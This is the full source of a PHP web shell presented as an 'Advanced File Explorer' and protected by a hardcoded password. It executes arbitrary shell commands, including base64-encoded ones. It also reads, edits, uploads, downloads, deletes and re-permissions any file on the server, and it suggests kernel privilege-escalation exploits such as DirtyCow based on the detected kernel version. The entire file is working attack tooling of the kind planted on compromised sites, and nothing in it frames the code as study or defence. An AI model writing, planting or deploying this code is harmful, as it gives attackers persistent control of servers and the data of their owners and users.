<?php
// Security headers
header('Content-Type: text/html; charset=utf-8');
header('X-Content-Type-Options: nosniff');
header("Cache-Control: no-cache, no-store, must-revalidate");
header("Pragma: no-cache");
header("Expires: 0");

// Authentication
define('ACCESS_KEY','LEETS');
session_start();

// Set home directory (where the script is located)
define('HOME_DIR', realpath(dirname(__FILE__)));

// Notification system
function showNotification($type, $message) {
    $_SESSION['notification'] = [
        'type' => $type,
        'message' => $message
    ];
}

function displayNotification() {
    if(isset($_SESSION['notification'])) {
        $notification = $_SESSION['notification'];
        $color = $notification['type'] === 'success' ? 'green' : 'red';
        echo '<div style="padding:10px; margin:10px 0; background:#'.$color.'; color:white">'
            .htmlspecialchars($notification['message']).
            '</div>';
        unset($_SESSION['notification']);
    }
}

if(!isset($_SESSION['auth']) && (!isset($_POST['pass']) || $_POST['pass'] !== ACCESS_KEY)) {
    echo '<!DOCTYPE html><html><body>
    <form method="post">
    <input type="password" name="pass" placeholder="Access Key">
    <button>Authenticate</button>
    </form></body></html>';
    exit;
}

$_SESSION['auth'] = true;

// System Information Functions
function getSystemInfo() {
    $info = [];
    
    // Basic system info
    $info['php_version'] = phpversion();
    $info['server_software'] = $_SERVER['SERVER_SOFTWARE'] ?? 'N/A';
    $info['user'] = get_current_user();
    $info['disabled_functions'] = ini_get('disable_functions') ?: 'None';
    
    // Kernel info (Linux only)
    if(strtoupper(substr(PHP_OS, 0, 3)) === 'LIN') {
        $info['os'] = php_uname('s');
        $info['hostname'] = php_uname('n');
        $info['kernel'] = php_uname('r');
        
        // Kernel exploit suggestions
        $kernelVersion = $info['kernel'];
        $exploits = [];
        
        if(version_compare($kernelVersion, '3.9.0', '<=')) {
            $exploits[] = 'CVE-2014-0038 (timeoutpwn)';
        }
        if(version_compare($kernelVersion, '3.13.0', '<=')) {
            $exploits[] = 'CVE-2015-1328 (overlayfs)';
        }
        if(version_compare($kernelVersion, '4.4.0', '<=')) {
            $exploits[] = 'CVE-2016-5195 (DirtyCow)';
        }
        
        $info['potential_exploits'] = $exploits ? implode(', ', $exploits) : 'None identified';
    }
    
    // Domain/IP information
    $info['server_ip'] = $_SERVER['SERVER_ADDR'] ?? 'N/A';
    $info['domains_on_ip'] = gethostbynamel($_SERVER['HTTP_HOST']) ?: ['N/A'];
    
    return $info;
}

// File system functions
function scanDirSafe($path) {
    if(!is_readable($path)) return false;
    
    $items = array_diff(scandir($path), ['.','..']);
    $sorted = [];
    
    // Separate directories and files
    foreach($items as $item) {
        $fullPath = $path.DIRECTORY_SEPARATOR.$item;
        if(is_dir($fullPath)) {
            $sorted['dirs'][$item] = $fullPath;
        } else {
            $sorted['files'][$item] = $fullPath;
        }
    }
    
    // Sort directories and files alphabetically
    if(isset($sorted['dirs'])) ksort($sorted['dirs']);
    if(isset($sorted['files'])) ksort($sorted['files']);
    
    return $sorted;
}

function fileReadSafe($path) {
    return is_readable($path) ? file_get_contents($path) : false;
}

// Generate clickable breadcrumbs
function breadcrumbs($path) {
    $parts = explode('/', trim($path, '/'));
    $breadcrumbs = [];
    $currentPath = '';
    
    foreach($parts as $part) {
        $currentPath .= '/' . $part;
        $breadcrumbs[] = '<a href="?dir='.urlencode($currentPath).'">'.htmlspecialchars($part).'</a>';
    }
    
    return implode(' / ', $breadcrumbs);
}

// Main interface
echo '<!DOCTYPE html>
<html>
<head>
    <title>Advanced File Explorer</title>
    <style>
        body {font-family: sans-serif; margin:0; padding:0}
        .sysinfo {background:#333; color:#fff; padding:10px; font-size:12px}
        .panel {background:#f5f5f5; padding:10px; margin:5px 0}
        pre {background:#eee; padding:10px; overflow:auto}
        .breadcrumb {background:#ddd; padding:5px 10px}
        table {width:100%; border-collapse:collapse}
        th {background:#333; color:#fff; text-align:left; padding:5px}
        td {padding:5px; border-bottom:1px solid #ddd}
        a {text-decoration:none; color:#0066cc}
        a:hover {text-decoration:underline}
        .dir {color:#0066cc; font-weight:bold}
        textarea {width:100%; height:300px; font-family:monospace}
        .home-btn {background:#4CAF50; color:white; border:none; padding:5px 10px; cursor:pointer}
        .newfile-form {margin-top:10px}
    </style>
    <script>
    // Auto refresh after file operations
    if(window.location.search.includes("delete") || 
       window.location.search.includes("rename") ||
       window.location.search.includes("create") ||
       window.location.search.includes("upload")) {
        setTimeout(function(){
            window.location.href = window.location.href.split("&")[0];
        }, 500);
    }
    </script>
</head>
<body>';

// Display system information
$sysinfo = getSystemInfo();
echo '<div class="sysinfo">
    <strong>System Information:</strong><br>
    PHP: '.$sysinfo['php_version'].' | 
    User: '.$sysinfo['user'].' | 
    OS: '.($sysinfo['os'] ?? 'N/A').'<br>
    Kernel: '.($sysinfo['kernel'] ?? 'N/A').' | 
    Potential Exploits: '.($sysinfo['potential_exploits'] ?? 'N/A').'<br>
    Server IP: '.$sysinfo['server_ip'].' | 
    Domains on IP: '.implode(', ', $sysinfo['domains_on_ip']).'
</div>';

// Current directory handling
$currentDir = (isset($_GET['dir']) && is_dir($path = realpath($_GET['dir']))) ? $path : getcwd();

echo '<div class="breadcrumb">
    <a href="?dir='.HOME_DIR.'" class="home-btn">Home</a>
    <strong>Path:</strong> /'.breadcrumbs($currentDir).'
</div>';

// Display notifications
displayNotification();

// File operations panel
echo '<div class="panel">
    <form method="get" style="display:inline">
        <input type="text" name="dir" placeholder="Enter path" value="'.htmlspecialchars($currentDir).'" style="width:300px">
        <button>Go</button>
    </form>
    <form method="post" enctype="multipart/form-data" style="display:inline; margin-left:20px">
        <input type="file" name="uploadfile">
        <button>Upload</button>
    </form>
    
    <div class="newfile-form">
        <form method="post">
            <input type="text" name="newfilename" placeholder="New file name" required>
            <button name="createfile">Create File</button>
        </form>
        <form method="post" style="margin-top:5px">
            <input type="text" name="newdirname" placeholder="New folder name" required>
            <button name="createdir">Create Folder</button>
        </form>
    </div>
</div>';

// Handle file creation
if(isset($_POST['createfile'])) {
    $newFile = $currentDir.DIRECTORY_SEPARATOR.$_POST['newfilename'];
    if(!file_exists($newFile)) {
        if(touch($newFile)) {
            showNotification('success', 'File created successfully: '.$_POST['newfilename']);
        } else {
            showNotification('error', 'Failed to create file');
        }
    } else {
        showNotification('error', 'File already exists');
    }
    header("Location: ?dir=".urlencode($currentDir));
    exit;
}

// Handle directory creation
if(isset($_POST['createdir'])) {
    $newDir = $currentDir.DIRECTORY_SEPARATOR.$_POST['newdirname'];
    if(!file_exists($newDir)) {
        if(mkdir($newDir)) {
            showNotification('success', 'Directory created successfully: '.$_POST['newdirname']);
        } else {
            showNotification('error', 'Failed to create directory');
        }
    } else {
        showNotification('error', 'Directory already exists');
    }
    header("Location: ?dir=".urlencode($currentDir));
    exit;
}

// Handle file editing
if(isset($_GET['edit']) && is_file($_GET['edit'])) {
    $fileToEdit = $_GET['edit'];
    $content = fileReadSafe($fileToEdit);
    
    if(isset($_POST['filecontent'])) {
        if(file_put_contents($fileToEdit, $_POST['filecontent']) !== false) {
            showNotification('success', 'File saved successfully');
        } else {
            showNotification('error', 'Failed to save file');
        }
        header("Location: ?dir=".urlencode($currentDir).'&edit='.urlencode($fileToEdit));
        exit;
    }
    
    echo '<div class="panel">
        <h3>Editing: '.htmlspecialchars(basename($fileToEdit)).'</h3>
        <form method="post">
            <textarea name="filecontent">'.htmlspecialchars($content).'</textarea><br>
            <button>Save</button>
            <a href="?dir='.urlencode($currentDir).'">Cancel</a>
        </form>
    </div>';
}
// Handle chmod
elseif(isset($_GET['chmod']) && file_exists($_GET['chmod'])) {
    $fileToChmod = $_GET['chmod'];
    
    if(isset($_POST['newmode'])) {
        $mode = octdec($_POST['newmode']);
        if(chmod($fileToChmod, $mode)) {
            showNotification('success', 'Permissions changed successfully');
        } else {
            showNotification('error', 'Failed to change permissions');
        }
        header("Location: ?dir=".urlencode($currentDir));
        exit;
    }
    
    $currentMode = substr(sprintf('%o', fileperms($fileToChmod)), -4);
    
    echo '<div class="panel">
        <h3>Change Permissions: '.htmlspecialchars(basename($fileToChmod)).'</h3>
        <p>Current permissions: '.$currentMode.'</p>
        <form method="post">
            <input type="text" name="newmode" placeholder="e.g., 0755" value="'.$currentMode.'">
            <button>Apply</button>
            <a href="?dir='.urlencode($currentDir).'">Cancel</a>
        </form>
    </div>';
}
// File listing
elseif(is_dir($currentDir)) {
    echo '<div class="panel"><table>
        <tr>
            <th>Name</th>
            <th>Size</th>
            <th>Permissions</th>
            <th>Actions</th>
        </tr>';
    
    $items = scanDirSafe($currentDir);
    
    // Display directories first
    if(isset($items['dirs'])) {
        foreach($items['dirs'] as $name => $fullPath) {
            echo '<tr>
                <td class="dir">📁 <a href="?dir='.urlencode($fullPath).'">'.htmlspecialchars($name).'</a></td>
                <td>-</td>
                <td>'.substr(sprintf('%o', fileperms($fullPath)), -4).'</td>
                <td>
                    <a href="?dir='.urlencode($currentDir).'&delete='.urlencode($fullPath).'" onclick="return confirm(\'Delete this directory?\')">Delete</a> |
                    <a href="?dir='.urlencode($currentDir).'&rename='.urlencode($name).'">Rename</a> |
                    <a href="?dir='.urlencode($currentDir).'&chmod='.urlencode($fullPath).'">Chmod</a>
                </td>
            </tr>';
        }
    }
    
    // Then display files
    if(isset($items['files'])) {
        foreach($items['files'] as $name => $fullPath) {
            $size = round(filesize($fullPath)/1024, 2).' KB';
            echo '<tr>
                <td>📄 <a href="?dir='.urlencode($currentDir).'&view='.urlencode($fullPath).'">'.htmlspecialchars($name).'</a></td>
                <td>'.$size.'</td>
                <td>'.substr(sprintf('%o', fileperms($fullPath)), -4).'</td>
                <td>
                    <a href="?dir='.urlencode($currentDir).'&delete='.urlencode($fullPath).'" onclick="return confirm(\'Delete this file?\')">Delete</a> |
                    <a href="?dir='.urlencode($currentDir).'&rename='.urlencode($name).'">Rename</a> |
                    <a href="?dir='.urlencode($currentDir).'&chmod='.urlencode($fullPath).'">Chmod</a> |
                    <a href="?dir='.urlencode($currentDir).'&edit='.urlencode($fullPath).'">Edit</a> |
                    <a href="?dir='.urlencode($currentDir).'&download='.urlencode($fullPath).'">Download</a>
                </td>
            </tr>';
        }
    }
    
    echo '</table></div>';
}

// File viewing/download
if(isset($_GET['view']) && is_file($_GET['view'])) {
    echo '<div class="panel"><pre>'.htmlspecialchars(fileReadSafe($_GET['view'])).'</pre></div>';
}

// Command execution panel
echo '<div class="panel">
    <form method="post">
        <input type="text" name="cmd" placeholder="Enter command" style="width:70%">
        <select name="mode">
            <option value="1">Normal</option>
            <option value="2">Base64</option>
            <option value="3">URL Encoded</option>
        </select>
        <button>Execute</button>
    </form>
</div>';

// Handle command execution
if(isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    $mode = $_POST['mode'] ?? 1;
    
    if($mode == 2) {
        $cmd = base64_decode($cmd);
    } elseif($mode == 3) {
        $cmd = urldecode($cmd);
    }
    
    echo '<div class="panel"><pre>';
    system($cmd);
    echo '</pre></div>';
}

echo '</body></html>';

// Handle file operations
if(isset($_GET['delete'])) {
    $file = $_GET['delete'];
    if(is_dir($file)) {
        if(rmdir($file)) {
            showNotification('success', 'Directory deleted successfully');
        } else {
            showNotification('error', 'Failed to delete directory (not empty?)');
        }
    } else {
        if(unlink($file)) {
            showNotification('success', 'File deleted successfully');
        } else {
            showNotification('error', 'Failed to delete file');
        }
    }
    header("Location: ?dir=".urlencode($currentDir));
    exit;
}

if(isset($_GET['rename']) && isset($_POST['newname'])) {
    $newName = $currentDir.DIRECTORY_SEPARATOR.$_POST['newname'];
    if(rename($currentDir.DIRECTORY_SEPARATOR.$_GET['rename'], $newName)) {
        showNotification('success', 'Renamed successfully');
    } else {
        showNotification('error', 'Failed to rename');
    }
    header("Location: ?dir=".urlencode($currentDir));
    exit;
}

if(isset($_FILES['uploadfile'])) {
    $target = $currentDir.DIRECTORY_SEPARATOR.basename($_FILES['uploadfile']['name']);
    if(move_uploaded_file($_FILES['uploadfile']['tmp_name'], $target)) {
        showNotification('success', 'File uploaded successfully');
    } else {
        showNotification('error', 'Failed to upload file');
    }
    header("Location: ?dir=".urlencode($currentDir));
    exit;
}

if(isset($_GET['download']) && is_file($_GET['download'])) {
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($_GET['download']).'"');
    readfile($_GET['download']);
    exit;
}
?>